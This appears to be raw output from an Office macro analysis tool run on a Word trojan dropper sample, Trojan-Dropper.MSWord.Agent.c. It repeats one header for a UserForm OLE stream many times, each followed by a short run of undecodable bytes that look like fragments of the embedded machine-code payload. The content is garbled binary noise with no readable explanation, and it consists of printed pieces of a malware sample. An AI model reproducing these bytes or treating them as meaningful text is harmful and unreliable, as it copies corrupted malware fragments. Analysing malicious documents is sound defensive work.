-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E��E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M��E�U�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�P�;	
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���Y��U��Q�E�P��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�Pj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�PP�t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j Y;�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����V�t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ANu�^Ã=�0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@��0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���t$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�;�Y�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;�Y�E�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�u�������YY
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��5�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�]��փ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�;�v
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�<9\u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�A;�r�9]�t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E��E�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����E�tLW�u��u�h�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��փ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�M�QP�u�]��u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���u�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SW�v���YY�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�}��u��A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u��9
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
_^[�ËD$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���V�H
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
QP�\�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��^ËD$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t'� �
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
:�t���t
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�����Y�U��QQ�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���E�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��SV�5<
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S�ֿ�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�E��֋M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3��&�5
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�օ�t��������t
S�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�օ�t�3�@_^[��U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
X�E�E��E�M�P3��E�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M��U
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Yt>h
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W������YYt-h�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W�������Yt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������YYt
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y_��[��U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E��E
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�V�u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�P�u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��YtW�}�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
u	�E�0#4
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�@�=W�u��I
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Yt,�u�VW����VW��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�FW�A
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y��_^��U��QQ�E�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�Php
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@�ËM�3�;M�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SV�5d
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�j
�]��]����u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Wj
���u
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��;�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j
�֋
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�M�QW���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
j
���u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��GW�g
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�؅�Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WS�u��)
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PS�=���YYj
�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��W�0
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
PS�E���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���tZj
��3�PPj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����E�u	P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�.j
��j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�PW�u��}��u��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���u�t��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�u���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�E�YY^[��U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������tz�E�P�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��YtlVh
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����YtH�\0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Ѕ�t4�h0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V����Ѕ�t V�E�hP
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P�Z�����
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��t
j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V�v���YY�E�P�R
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YY^3���Q�$$
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S3���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Y
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
SW�4�����YYtsS��
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����YtfSV������YYtY�`0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
VW����Ѕ�tAU�����5�0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
WV�Ӆ�t�W����Y]�
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
YY_^[Y�SVj
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����Yt&j
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
2�V�C
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Y^��[�U���
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
3�SSS�E�P�d0@
-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Dropper.MSWord.Agent.c' - OLE stream: '_VBA_PROJECT_CUR/UserForm1/i43/i36/o'
